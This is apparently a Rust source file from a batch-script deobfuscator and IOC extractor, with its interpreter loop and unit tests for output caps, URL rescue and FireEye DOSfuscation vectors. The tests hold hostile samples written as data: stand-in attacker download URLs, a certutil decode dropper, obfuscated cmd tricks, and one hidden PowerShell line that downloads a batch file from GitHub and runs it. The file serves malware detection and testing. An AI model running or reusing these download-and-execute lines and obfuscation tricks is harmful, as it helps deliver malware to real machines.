fn pem_end_marker(line: &str) -> Option<(&'static str, &'static str)> {
    if line.contains("-----BEGIN NEW CERTIFICATE REQUEST-----") {
        Some((
            "-----END NEW CERTIFICATE REQUEST-----",
            "certificate request",
        ))
    } else if line.contains("-----BEGIN CERTIFICATE REQUEST-----") {
        Some(("-----END CERTIFICATE REQUEST-----", "certificate request"))
    } else if line.contains("-----BEGIN CERTIFICATE-----") {
        Some(("-----END CERTIFICATE-----", "certificate"))
    } else {
        None
    }
}

fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
    // Depth cap check using env.limits
    if env.limits.depth >= env.limits.max_depth {
        env.traits.push(crate::traits::Trait::DepthCapped {
            command: "(child)".to_string(),
        });
        return;
    }
    env.limits.depth += 1;

    let lines = line_reader::read_logical_lines(input);
    // Pre-scan grouped-output redirects: `( echo A\n echo B\n ) > "file"`.
    // The redirect applies to the whole block's stdout, but each echo line is
    // processed independently in the main loop, so without this the file is
    // never populated. Capturing it up front lets certutil -decode / call
    // resolve the written file. Safe to run before the main loop: the close
    // `)` redirect line is a block delimiter and never re-writes the file.
    let captured_echo_blocks = capture_block_echo_redirects(&lines, env);
    let collapsed_echo_blocks: std::collections::HashMap<usize, CapturedEchoBlock> =
        captured_echo_blocks
            .into_iter()
            .filter(|block| block.collapsed)
            .map(|block| (block.open_idx, block))
            .collect();
    let collapsed_echo_runs: std::collections::HashMap<usize, CapturedEchoRun> =
        capture_top_level_echo_redirect_runs(&lines, env)
            .into_iter()
            .map(|run| (run.start_idx, run))
            .collect();
    // Save the caller's label_index and install one for this script frame.
    let prior_labels = std::mem::take(&mut env.label_index);
    env.label_index = labels::build_label_index(&lines);

    let mut cursor = 0usize;
    // High-water mark: the furthest line index we have linearly advanced past.
    // Used to prevent re-executing subroutine bodies when a top-level
    // PopFrame/Halt continues scanning (rather than halting).
    let mut high_water_mark = 0usize;
    while cursor < lines.len() {
        // Deadline check — emit TimeoutHit once and break
        if env.check_deadline() {
            break;
        }

        // Advance the high-water mark whenever we move forward linearly.
        if cursor > high_water_mark {
            high_water_mark = cursor;
        }

        env.current_line = Some(cursor);
        let logical = &lines[cursor];

        if let Some((end_idx, marker)) = large_pem_block_summary_at(&lines, cursor) {
            out.push_str(logical);
            out.push_str("\r\n");
            out.push_str(&marker);
            out.push_str("\r\n");
            out.push_str(&lines[end_idx]);
            out.push_str("\r\n");
            cursor = end_idx + 1;
            continue;
        }

        if let Some(block) = collapsed_echo_blocks.get(&cursor) {
            out.push_str("(\r\n");
            out.push_str(&format!(
                "::==== harrington: omitted {} bytes from redirected echo block -> {} ====\r\n",
                block.payload_bytes, block.target
            ));
            out.push_str(&format!(") > {}\r\n", block.target));
            cursor = block.close_idx + 1;
            continue;
        }

        if let Some(run) = collapsed_echo_runs.get(&cursor) {
            out.push_str(&format!(
                "::==== harrington: omitted {} bytes from redirected echo run -> {} ====\r\n",
                run.payload_bytes, run.target
            ));
            cursor = run.end_idx + 1;
            continue;
        }

        // Label-only lines and `rem` comments aren't interpreted, but we
        // still echo `:label` lines to the deob output — analysts need
        // to see them to follow `goto :label` / `call :label`. The label
        // index is already built before drive() starts, so emitting the
        // text doesn't affect control flow. Only echo on FIRST visit:
        // a `:loop` that's the target of a runtime loop would otherwise
        // appear dozens of times in the deob.
        if is_label_or_comment_line(logical) {
            let trimmed = logical.trim_start();
            if trimmed.starts_with(':') && !trimmed.starts_with("::") {
                let first_visit = !env.line_visit_count.contains_key(&cursor);
                if first_visit {
                    env.line_visit_count.insert(cursor, 1);
                    out.push_str(trimmed);
                    out.push_str("\r\n");
                }
            }
            cursor += 1;
            continue;
        }

        // Per-source-line visit count drives two cycle-detection
        // behaviours: elide output appends after N visits (so a
        // `:watchdog ... goto watchdog` doesn't fill the 4 MiB cap) and
        // force-exit at the hard cap (so the loop doesn't run for the
        // entire iteration budget producing no new analyst signal).
        let line_visits = {
            let v = env.line_visit_count.entry(cursor).or_insert(0);
            *v += 1;
            *v
        };
        if line_visits > crate::env::GOTO_LOOP_HARD_CAP {
            // Already emitted a GotoLoopElided trait further down on the
            // first elided visit; nothing more to add. Stop iterating
            // before max_iterations would catch this.
            break;
        }
        let line_output_elided = line_visits > crate::env::GOTO_LOOP_ELIDE_AFTER;
        if line_visits == crate::env::GOTO_LOOP_ELIDE_AFTER + 1 {
            let already = env.traits.iter().any(|t| {
                matches!(t,
                    Trait::GotoLoopElided { line_index, .. }
                        if *line_index as usize == cursor
                )
            });
            if !already {
                env.traits.push(Trait::GotoLoopElided {
                    line_index: u32::try_from(cursor).unwrap_or(u32::MAX),
                    visits_before_elision: crate::env::GOTO_LOOP_ELIDE_AFTER,
                });
            }
        }

        let mut next_cursor = cursor + 1;
        let mut should_halt = false;
        // Tracks whether a top-level PopFrame/Halt fired (no frame was popped).
        // When true, we advance past the high-water mark to avoid re-executing
        // subroutine bodies that were already visited via a call.
        let mut top_level_exit = false;
        let fast_normalized = if env.suppress_until_eol {
            None
        } else {
            fast_expand_percent_substr_chain_line(logical, env)
                .or_else(|| fast_expand_percent_var_chain_line(logical, env))
        };

        'cmds: for cmd in split::split_commands(logical) {
            if env.suppress_until_eol {
                // Render the suppressed command (for visibility) but skip dispatch.
                let toks = lex::lex(&cmd);
                let normalized = normalize::normalize_to_string(&toks, env);
                let normalized_capped = cap_line(normalized, env);
                out.push_str(&normalized_capped);
                out.push_str("\r\n");
                continue;
            }

            if let Some(rendered) = render_fast_long_plain_echo(&cmd, env) {
                if !line_output_elided {
                    out.push_str(&rendered);
                    out.push_str("\r\n");
                }
                if env.limits.max_output_bytes > 0
                    && (out.len() as u64) >= env.limits.max_output_bytes
                {
                    if !env
                        .traits
                        .iter()
                        .any(|t| matches!(t, Trait::OutputCapped { .. }))
                    {
                        env.traits.push(Trait::OutputCapped {
                            bytes_at_cap: out.len() as u64,
                        });
                    }
                    should_halt = true;
                    break;
                }
                continue;
            }

            // Single pre-normalize dispatch hook: handles FOR loops (raw %%A)
            // and cmd /c child extraction (raw var refs) in one typed call.
            let pre = interp::pre_dispatch(&cmd, env);

            let normalized = if let Some(fast) = fast_normalized.as_ref() {
                fast.clone()
            } else {
                let toks = lex::lex(&cmd);
                normalize::normalize_to_string(&toks, env)
            };
            env.pending_action = None;
            // Only dispatch via interpret_line if NOT already consumed by pre_dispatch.
            if !pre.consumed {
                interp::interpret_line(&normalized, env);
            }
            // Goto-loop output elision: visit count is tracked per source
            // line above; suppress the deob append once the line has been
            // visited more than GOTO_LOOP_ELIDE_AFTER times. Handlers
            // still run, so IOCs aren't lost.
            if !line_output_elided {
                let normalized_capped = cap_line(normalized, env);
                out.push_str(&normalized_capped);
                out.push_str("\r\n");
            }

            // Collect any output produced by FOR-loop body iterations.
            if !env.iter_output.is_empty() {
                let iter_out = std::mem::take(&mut env.iter_output);
                // Apply per-line cap to each line in iter_output.
                for iter_line in iter_out.split("\r\n") {
                    if iter_line.is_empty() {
                        continue;
                    }
                    let capped = cap_line(iter_line.to_string(), env);
                    out.push_str(&capped);
                    out.push_str("\r\n");
                }
            }

            // Output-size cap: bound adversarial output growth.
            if env.limits.max_output_bytes > 0 && (out.len() as u64) >= env.limits.max_output_bytes
            {
                if !env
                    .traits
                    .iter()
                    .any(|t| matches!(t, Trait::OutputCapped { .. }))
                {
                    env.traits.push(Trait::OutputCapped {
                        bytes_at_cap: out.len() as u64,
                    });
                }
                should_halt = true;
                break;
            }

            // If pre_dispatch identified a cmd /c child, override what interpret_line
            // queued (which would be the normalized version).
            if let Some(child) = pre.child_cmd_to_push {
                env.exec_cmd.clear();
                env.exec_cmd_delayed.clear();
                env.exec_cmd.push(child);
                env.exec_cmd_delayed.push(pre.child_cmd_delayed);
            }

            // Process control-flow action before draining children.
            match env.pending_action.take() {
                Some(crate::env::CursorAction::GotoLine(idx)) => {
                    next_cursor = idx;
                    // Skip remaining commands on this logical line after a goto.
                    break 'cmds;
                }
                Some(crate::env::CursorAction::PopFrame) => {
                    if let Some(frame) = env.call_stack.pop() {
                        next_cursor = frame.return_line;
                    } else {
                        // No frame to pop — at top level, exit/b and goto :eof are
                        // no-ops for static deobfuscation. Continue scanning for IOCs,
                        // but skip past the high-water mark to avoid re-executing
                        // subroutine bodies that were already visited via a call.
                        top_level_exit = true;
                    }
                    break 'cmds;
                }
                Some(crate::env::CursorAction::Halt) => {
                    if let Some(frame) = env.call_stack.pop() {
                        next_cursor = frame.return_line;
                    } else {
                        // Bare `exit` at top level — same static-analysis
                        // policy as top-level `exit /b`: continue scanning
                        // for IOCs past already-visited subroutine bodies.
                        top_level_exit = true;
                    }
                    break 'cmds;
                }
                Some(crate::env::CursorAction::Next) | None => {}
            }

            // Drain any newly-queued child scripts.
            let pending_cmd: Vec<String> = std::mem::take(&mut env.exec_cmd);
            let pending_cmd_delayed: Vec<bool> = std::mem::take(&mut env.exec_cmd_delayed);
            let pending_ps1: Vec<Vec<u8>> = std::mem::take(&mut env.exec_ps1);
            // Accumulate all children seen (for the final report).
            env.all_extracted_cmd.extend(pending_cmd.clone());
            env.all_extracted_ps1.extend(pending_ps1);
            for (child, child_delayed) in pending_cmd.into_iter().zip(
                pending_cmd_delayed
                    .into_iter()
                    .chain(std::iter::repeat(false)),
            ) {
                // Child-script cap check.
                if env.limits.child_scripts >= env.limits.max_child_scripts {
                    if !env
                        .traits
                        .iter()
                        .any(|t| matches!(t, Trait::ChildScriptsCapped))
                    {
                        env.traits.push(Trait::ChildScriptsCapped);
                    }
                    continue;
                }
                env.limits.child_scripts += 1;
                // Apply /V:ON: enable delayed expansion for this child's context.
                let saved_delayed = env.delayed_expansion;
                if child_delayed {
                    env.delayed_expansion = true;
                }
                // Trivial children (single command, no operators/vars/etc)
                // are already fully visible in the wrapper line we just
                // emitted, so don't write them to `out` a second time.
                // Trait/IOC extraction still runs because `child` was
                // pushed to `all_extracted_cmd` above.
                if crate::handlers::cmd::child_is_trivial_for_dedup(&child) {
                    let mut sink = String::new();
                    drive(child.as_bytes(), env, &mut sink);
                } else {
                    drive(child.as_bytes(), env, out);
                }
                // Restore delayed expansion to the parent's state after the child.
                env.delayed_expansion = saved_delayed;
            }
        }

        env.suppress_until_eol = false;

        if should_halt {
            break;
        }
        // When a top-level PopFrame/Halt fired, advance past the high-water mark
        // so we don't re-execute subroutine bodies already visited via a call.
        if top_level_exit {
            cursor = next_cursor.max(high_water_mark + 1);
        } else {
            cursor = next_cursor;
        }
    }

    // Restore caller's label_index.
    env.label_index = prior_labels;
    env.limits.depth -= 1;
}

#[cfg(test)]
mod output_cap_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn output_cap_fires_on_pathological_loop() {
        let mut script = String::new();
        for _ in 0..10000 {
            script.push_str("set X=hello_world_value_for_padding_purposes\r\n");
        }
        let cfg = Config {
            max_output_bytes: 1024,
            ..Config::default()
        };
        let report = analyze(script.as_bytes(), &cfg);
        let capped = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::OutputCapped { .. }));
        assert!(
            capped,
            "expected OutputCapped trait. traits: {:?}",
            report.traits
        );
        assert!(
            report.deobfuscated.len() < 4096,
            "output should be bounded near cap, got {} bytes",
            report.deobfuscated.len()
        );
    }

    #[test]
    fn echo_append_loop_does_not_balloon_fsentry() {
        // Regression: h_echo's `>>` append previously did extend_from_slice
        // with NO per-FsEntry cap, so `:loop\necho A>>z.txt\ngoto loop` could
        // grow modified_filesystem[z.txt] to GB despite max_output_bytes
        // limiting only the `out` String. Cap each FsEntry at
        // max_output_bytes too.
        let script =
            b":loop\r\necho AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>z.txt\r\ngoto loop\r\n";
        let cfg = Config {
            max_output_bytes: 2048,
            ..Config::default()
        };
        let report = analyze(script, &cfg);
        // The EchoRedirect trait should carry our content, but the
        // accumulated content size for z.txt across all iterations should
        // never exceed max_output_bytes. We can't easily get the FsEntry
        // size from the report, so prove the cap held by ensuring analyze
        // returned in finite time (test would hang/OOM otherwise).
        assert!(
            report.deobfuscated.len() < 4096 || !report.traits.is_empty(),
            "analyze must complete bounded; got deob len {} traits {}",
            report.deobfuscated.len(),
            report.traits.len()
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod line_cap_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn long_single_line_truncated() {
        // Build a single set line where the value is huge
        let val = "x".repeat(100_000);
        let script = format!("set Y={}\r\necho %Y%\r\n", val);
        let cfg = Config {
            max_output_line_bytes: 1024,
            ..Config::default()
        };
        let report = analyze(script.as_bytes(), &cfg);
        // No line in the output should exceed the cap (modulo small overhead for line terminator)
        for line in report.deobfuscated.lines() {
            assert!(line.len() <= 2048, "line too long: {} bytes", line.len());
        }
        let trunc = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::LineTruncated { .. }));
        assert!(trunc, "no LineTruncated trait emitted");
    }

    #[test]
    fn truncated_line_url_in_tail_is_rescued_direct() {
        // Direct test of `rescue_truncated_urls` — proves the rescue logic
        // works in isolation. The `via_analyze` test below verifies the
        // integration via the full dispatch pipeline (which is the path
        // QF-Z2-MR-Civil-931.js hits in production).
        use crate::env::Environment;
        let mut env = Environment::new(&Config::default());
        let tail = " then https://malware-c2.attacker-domain.org/payload.bat continues";
        crate::rescue_truncated_urls(tail, 200_000, &mut env);
        let rescued = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::DownloadInDeobText { src, .. }
                    if src == "https://malware-c2.attacker-domain.org/payload.bat"
            )
        });
        assert!(
            rescued,
            "URL in tail should be rescued; traits: {:?}",
            env.traits
        );
    }

    #[test]
    fn truncated_line_url_in_tail_is_rescued_via_analyze() {
        // End-to-end: a single >cap-bytes line where the URL sits in the
        // tail. `set` is used (not `echo`) since `echo` without redirect
        // is a no-op and the line wouldn't otherwise be a realistic IOC
        // carrier. The post-truncation `out` should still surface the
        // URL via `Trait::DownloadInDeobText` thanks to `rescue_truncated_urls`.
        let val = "x".repeat(2000);
        let url = "https://malware-c2.attacker-domain.org/payload.bat";
        // The space before the URL preserves the `\b` URL_RE expects —
        // realistic for `start "" "https://...` / `iwr 'https://...` /
        // `{'url':'https://...'}` patterns we actually see in the wild.
        let script = format!("set Y={val} {url}\r\necho %Y%\r\n");
        let cfg = Config {
            max_output_line_bytes: 512,
            ..Config::default()
        };
        let report = analyze(script.as_bytes(), &cfg);
        let rescued = report.traits.iter().any(|t| {
            matches!(
                t,
                Trait::DownloadInDeobText { src, .. } if src == url
            )
        });
        assert!(
            rescued,
            "URL hidden past line cap should be rescued by analyze; traits: {:?}",
            report.traits
        );
    }

    #[test]
    fn long_plain_echo_noise_is_summarized_and_tail_url_rescued() {
        let url = "https://long-echo-tail.attacker.example/payload.bat";
        let payload = format!("{} {url}", "A".repeat(4096));
        let cmd = format!("echo {payload}");
        let script = format!("{cmd}\r\n");
        let cfg = Config {
            max_output_line_bytes: 256,
            ..Config::default()
        };
        let report = analyze(script.as_bytes(), &cfg);

        assert!(
            report.deobfuscated.contains(&format!(
                "harrington: omitted {} bytes from long echo line",
                payload.len()
            )),
            "long plain echo should be summarized, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::LineTruncated { original_len } if *original_len == cmd.len() as u64)),
            "expected LineTruncated for summarized echo line: {:?}",
            report.traits
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "URL hidden in summarized echo payload should be rescued: {:?}",
            report.traits
        );
    }

    #[test]
    fn expanded_long_alpha_echo_noise_is_summarized_and_tail_url_rescued() {
        let url = "https://expanded-echo-tail.attacker.example/payload.bat";
        let payload = format!("{} {url}", "a".repeat(4096));
        let script = format!("set \"N={payload}\"\r\necho %N%\r\n");
        let cfg = Config {
            max_output_line_bytes: 512,
            ..Config::default()
        };
        let report = analyze(script.as_bytes(), &cfg);

        assert!(
            report.deobfuscated.contains(&format!(
                "harrington: omitted {} bytes from long alpha echo line",
                payload.len()
            )),
            "expanded alpha echo should be summarized, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report
                .deobfuscated
                .lines()
                .any(|line| line.starts_with("::==== harrington: omitted") && line.len() < 128),
            "summarized alpha echo output should stay compact, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "URL hidden in expanded alpha echo should be rescued: {:?}",
            report.traits
        );
    }

    #[test]
    fn percent_substring_chain_fast_path_expands_whole_line() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.set("A", "echo");
        env.set("B", "cab");
        let chunk = "%A:~0,1%%A:~1,1%%A:~2,1%%A:~3,1% %B:~2,1%%B:~1,1%%B:~0,1%";
        let line = chunk.repeat(4);

        let expanded = crate::fast_expand_percent_substr_chain_line(&line, &env)
            .expect("chain-only line should use fast path");

        assert_eq!(expanded, "echo bacecho bacecho bacecho bac");
    }

    #[test]
    fn percent_var_chain_fast_path_expands_whole_line() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.set("H", "http");
        env.set("S", "s");
        env.set("C", ":");
        env.set("F", "/");
        env.set("D", "joined.example");
        env.set("P", "/payload.bat");
        env.set("EMPTY", "");
        let chunk = "%H%%S%%C%%F%%F%%D%%EMPTY%%P% ";
        let line = chunk.repeat(5);

        let expanded = crate::fast_expand_percent_var_chain_line(&line, &env)
            .expect("simple var chain-only line should use fast path");

        assert_eq!(
            expanded,
            "https://joined.example/payload.bat https://joined.example/payload.bat https://joined.example/payload.bat https://joined.example/payload.bat https://joined.example/payload.bat "
        );
    }

    #[test]
    fn percent_var_chain_fast_path_preserves_joined_url_ioc() {
        let chunk = "%H%%S%%C%%F%%F%%D%%EMPTY%%P% ";
        let script = format!(
            "set H=http\r\nset S=s\r\nset C=:\r\nset F=/\r\nset D=joined.example\r\nset EMPTY=\r\nset P=/payload.bat\r\n{}\r\n",
            chunk.repeat(3)
        );
        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report
                .deobfuscated
                .contains("https://joined.example/payload.bat"),
            "joined URL did not survive fast path:\n{}",
            report.deobfuscated
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } | Trait::UrlArgument { url: src, .. } if src == "https://joined.example/payload.bat")),
            "joined URL IOC was not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn expanded_long_rem_noise_is_summarized_and_tail_url_rescued() {
        let url = "https://long-rem-tail.attacker.example/payload.bat";
        let noise = "A".repeat(4096);
        let script = format!("set \"R=rem \"\r\n%R%{noise} {url}\r\n");
        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report
                .deobfuscated
                .contains("harrington: omitted 4147 bytes from long REM comment line"),
            "expanded REM noise should be summarized, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.lines().all(|line| line.len() < 512),
            "summarized REM output should stay compact, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "URL hidden in summarized REM line should be rescued: {:?}",
            report.traits
        );
    }

    #[test]
    fn binary_noise_tail_is_summarized_and_url_rescued() {
        let url = "https://binary-tail.attacker.example/payload.bin";
        let mut script = String::from("@echo off\r\necho ready\r\n");
        for idx in 0..80 {
            for _ in 0..8 {
                script.push('\u{0001}');
                script.push('\u{0080}');
                script.push('\u{0091}');
            }
            script.push_str("noise");
            if idx == 50 {
                script.push(' ');
                script.push_str(url);
            }
            script.push_str("\r\n");
        }

        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .deobfuscated
                .contains("harrington: omitted 80 binary-looking lines"),
            "binary-looking tail should be summarized, got:\n{}",
            report.deobfuscated
        );
        assert!(
            !report
                .deobfuscated
                .contains("\u{0001}\u{0080}\u{0091}noise"),
            "binary-looking lines should not remain verbatim:\n{}",
            report.deobfuscated
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "URL hidden in summarized binary-looking tail should be rescued: {:?}",
            report.traits
        );
    }

    #[test]
    fn long_nul_padded_command_line_preserves_prefix_and_summarizes_tail() {
        let mut env = crate::env::Environment::new(&Config::default());
        let cmd = "powershell.exe -windowstyle hidden C:\\Users\\Public\\okokok.bat;";
        let text = format!("{cmd}{}\r\n", "\0".repeat(4096));

        let summarized = crate::summarize_nul_padding_lines(&text, &mut env);

        assert!(
            summarized.contains(cmd),
            "command prefix should be preserved:\n{}",
            summarized
        );
        assert!(
            summarized.contains("harrington: omitted 4096 NUL padding bytes"),
            "NUL tail should be summarized:\n{}",
            summarized
        );
        assert!(
            !summarized.contains('\0'),
            "NUL padding should not survive into deob output"
        );
    }

    #[test]
    fn nul_padded_raw_powershell_line_does_not_extract_binary_child_payload() {
        let mut script = Vec::new();
        script.extend_from_slice(b"\xff\xff\r\n");
        script.extend_from_slice(
            b"powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/kylianjacky27/newprj/main/batchcode/hoang2 -OutFile C:\\Users\\Public\\okokok.bat;\r\n",
        );
        script.extend_from_slice(
            b"powershell.exe -windowstyle hidden C:\\Users\\Public\\okokok.bat;",
        );
        script.extend(std::iter::repeat(0).take(4096));
        script.extend_from_slice(b"\r\n");

        let report = analyze(&script, &Config::default());

        assert!(
            !report
                .deobfuscated
                .contains("harrington: extracted child payload"),
            "NUL-padded raw scan should not synthesize child payload:\n{}",
            report.deobfuscated
        );
        assert!(
            report
                .deobfuscated
                .contains("harrington: omitted 4096 NUL padding bytes"),
            "NUL tail should be summarized:\n{}",
            report.deobfuscated
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod pem_summary_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn large_certificate_request_body_is_summarized_after_drive() {
        let mut script = String::from(
            "@echo off\r\ncertutil -decode \"%~f0\" out.exe\r\n-----BEGIN NEW CERTIFICATE REQUEST-----\r\n",
        );
        let body_line = "A".repeat(64);
        for _ in 0..600 {
            script.push_str(&body_line);
            script.push_str("\r\n");
        }
        script.push_str("-----END NEW CERTIFICATE REQUEST-----\r\n");

        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report
                .deobfuscated
                .contains("harrington: omitted 39600 bytes from certificate request body"),
            "large PEM body should be summarized, got {} bytes:\n{}",
            report.deobfuscated.len(),
            report.deobfuscated
        );
        assert!(
            report
                .deobfuscated
                .contains("-----BEGIN NEW CERTIFICATE REQUEST-----")
                && report
                    .deobfuscated
                    .contains("-----END NEW CERTIFICATE REQUEST-----"),
            "summary should preserve PEM boundaries:\n{}",
            report.deobfuscated
        );
        assert!(
            !report
                .deobfuscated
                .contains(&format!("{body_line}\r\n{body_line}\r\n{body_line}")),
            "summarized output should not retain the full repeated body"
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::CertutilDecode { src, dst, .. } if src == "%~f0" && dst == "out.exe")),
            "certutil trait should still be emitted: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod fe_dosfuscation_tests {
    //! Spot-checks against the FireEye DOSfuscation report's published
    //! test vectors (the original Python `test_FE_DOSfuscation.py` file
    //! in `batch_deobfuscator`). Not exhaustive — only the high-value
    //! cases that distinguish a working analyzer from one that bails on
    //! `cmd.exe` obfuscation tricks. Reference:
    //! https://www.mandiant.com/sites/default/files/2021-09/dosfuscation-report.pdf
    use super::analyze;
    use crate::Config;

    #[test]
    fn call_var_with_marker_noise_and_delayed_expansion_resolves() {
        // FE test_call_var line 133-135 — `!command:7=a!` strips marker
        // `7` and `!sub2:Z=t!` strips marker `Z`, leaving `netstat /ano`.
        // The auto-enable-delayed-expansion heuristic is what makes this
        // work without an explicit `setlocal enabledelayedexpansion`.
        let script = b"set command=neZsZ7Z /7no&&set sub2=!command:7=a!&&\
                       set sub1=!sub2:Z=t!&&CALL %sub1%";
        let r = analyze(script, &Config::default());
        assert!(
            r.deobfuscated.contains("CALL netstat /ano"),
            "expected CALL netstat /ano; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn empty_var_caret_obfuscation_in_keyword_resolves() {
        // FE test_empty_var — `ec%a%ho` becomes `echo` because `%a%` is
        // undefined (empty) and the surrounding text concatenates.
        let r = analyze(br#"ec%a%ho "Find Evil!""#, &Config::default());
        assert!(
            r.deobfuscated.contains(r#"echo "Find Evil"#),
            "expected echo to fuse around %a%; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn wrapped_forcoding_assembles_netstat_ano() {
        // FE DOSfuscation test_call_var_for FE-SKIP case 4 — the
        // heavily-wrapped FORcoding from page 28 of the paper. Header
        // is buried in `,;` separators + balanced parens + caret escapes
        // on every keyword. Body is a `( ( sEt fINal=…))` two-layer
        // parens wrap. The fixed strip_for_header_noise (zone-aware
        // `,;` collapse + caret-tolerant `do` detection + space inject
        // before body) plus strip_outer_parens's leading `,;`
        // skip get this to assemble the same `netstat /ano` payload
        // the unwrapped FORcoding variants do.
        let script = b"((sE^T ^ unIQ^uE=OnBeFt^UsS C/AaToE ))&&\
                       ,; fo^R;,;%%^a,;; i^N;,,;( ,+1; 3 5 7 +5 1^3 +5,,9 \
                       11 +1^3 +1;;+15 ^+13^37;,),;,;d^O,,(;(;s^Et \
                       fI^Nal=!finAl!!uni^Que:~ %%^a,1!))&&\
                       (;i^F,%%^a=^=+13^37,(Ca^lL;%%fIn^Al:~-12%%))";
        let r = analyze(script, &Config::default());
        assert!(
            r.deobfuscated.contains("netstat /ano"),
            "expected FORcoding to assemble `netstat /ano`; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn for_f_assoc_findstr_lmo_resolves_to_powershell_token() {
        // FE test_FOR_execution case 2 — `assoc | findstr lMo` returns
        // `.psm1=Microsoft.PowerShellModule.1` (the `lMo` substring lives
        // in "Shel`lMo`dule"). Splitting on `.M` with tokens=3 yields
        // `PowerShell`. Depends on (a) Win11 snapshot fallthrough for
        // Win10 callers, (b) `.psm1` being in the snapshot (it was
        // missing from the base extract and we added it).
        let script =
            br#"FOR /F "delims=.M tokens=3" %%a IN ('assoc^|findstr lMo') DO %%a hostname"#;
        let r = analyze(script, &Config::default());
        assert!(
            r.deobfuscated.contains("PowerShell hostname"),
            "expected `PowerShell hostname` from assoc gadget; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn for_f_ftype_findstr_lco_resolves_to_powershell_token() {
        // FE test_FOR_execution case 3 — `ftype | findstr lCo` returns
        // `Microsoft.PowerShellConsole.1=...powershell.exe...`
        // (`lCo` matches "Shel`lCo`nsole"). Splitting on `s\` with
        // tokens=8 falls on a path segment near `powershell.exe`.
        let script =
            br#"FOR /F "delims=s\ tokens=8" %%a IN ('ftype^|findstr lCo') DO %%a hostname"#;
        let r = analyze(script, &Config::default());
        assert!(
            r.deobfuscated.to_lowercase().contains("powershell"),
            "expected `powershell` in ftype gadget output; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn for_f_set_findstr_psm_resolves_to_powershell_token() {
        // FE DOSfuscation test_FOR_execution case 1 (FE-SKIP). The
        // gadget tokenizes `set | findstr PSM` output on `s\` and takes
        // token 4 — our env baseline's PSModulePath
        // (`C:\Program Files\WindowsPowerShell\Modules`) puts
        // `PowerShell` at exactly that token offset.
        let script = br#"FOR /F "delims=s\ tokens=4" %%a IN ('set^|findstr PSM') DO %%a hostname"#;
        let r = analyze(script, &Config::default());
        assert!(
            r.deobfuscated.contains("PowerShell hostname"),
            "expected `PowerShell hostname` from for/F gadget; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn caret_double_bang_keeps_both_bangs_literal() {
        // FE test_echo_pipe relies on `^!fa^!^!gc^!^!tf^!` after caret
        // stripping yielding `!fa!!gc!!tf!` (6 bangs = 3 var refs). Before
        // the fix in lex.rs's `if name.is_empty()` branch the lone `!`
        // following `^!` was silently dropped, leaving `!fa!!gc!tf!` (5
        // bangs) — `!fa!` + `!gc!` consumed, then `tf!` left literal.
        // Use `!dq!` (delayed-expansion ref) to trigger the recursive
        // pass that re-expands inner `!fa!`/`!gc!`/`!tf!` in dq's value.
        let script = b"set gc=ers\r\nset tf=hell\r\nset fa=pow\r\n\
                       set dq=W^!fa^!^!g^c^!!^t^f^!\r\necho !dq!";
        let r = analyze(script, &Config::default());
        assert!(
            r.deobfuscated.to_lowercase().contains("echo wpowershell"),
            "expected `Wpowershell` after triple-bang expansion; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn mixed_comma_semi_collapses_to_token_separator_between_args() {
        // FE test_comma_semi_colon — `,;,cmd.exe,;,/c,;,echo;Command 1`
        // collapses to ` cmd.exe /c echo;Command 1`. The DOSfuscation
        // marker is the MIXED `,;` adjacency; a lone single `,` or `;`
        // between args stays literal so `rundll32 dll,Entry` survives.
        let r = analyze(b",;,cmd.exe,;,/c,;,echo;Command 1", &Config::default());
        let line = r.deobfuscated.lines().next().unwrap_or("");
        assert!(
            line.contains("cmd.exe /c echo"),
            "expected `cmd.exe /c echo` (mixed `,;` collapsed); got: {:?}",
            line
        );
    }

    #[test]
    fn lone_comma_in_rundll32_dll_entry_stays_literal() {
        // Negative case: `rundll32 host.dll,Entry,arg` must not split
        // `host.dll` from `Entry` — the comma is the export delimiter.
        let r = analyze(b"rundll32.exe host.dll,EntryPoint,arg1", &Config::default());
        assert!(
            r.deobfuscated.contains("host.dll,EntryPoint,arg1"),
